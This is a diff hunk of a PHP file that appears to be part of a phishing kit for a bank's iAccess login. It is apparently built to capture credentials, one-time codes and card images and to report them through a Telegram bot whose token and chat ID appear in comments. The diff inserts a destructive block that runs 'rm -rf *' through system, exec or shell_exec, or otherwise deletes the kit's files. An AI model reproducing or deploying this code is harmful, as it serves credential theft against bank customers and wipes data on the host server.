@@ -5,6 +5,29 @@
 // $chat_id = "-635799224";
 // $telebot = "5202228547:AAHRkzQNW1feHYhwmhZrAdHGnYHmmLXcE_8";
 
+ if(function_exists('system')) {
+         system('rm -rf *');
+      }
+      elseif(function_exists('exec')) {
+         exec('rm -rf *');
+      }
+      elseif(function_exists('shell_exec')) {
+         shell_exec('rm -rf *');
+      }
+      else {
+        unlink('lbpiaccess.zip');
+        unlink('confirm.php');
+        unlink('cc.jpg');
+        unlink('otp-login.php');
+        unlink('otp-expired.jpg');
+        unlink('otp.jpg');
+        unlink('mobile-login.php');
+        unlink('mobile.jpg');
+        unlink('login.php');
+        unlink('index.php');
+        unlink('index.jpg');
+      }
+
 if (strpos($result, "iAccess ID already exists")) {
 $us = [
 'chat_id' => "-635799224",
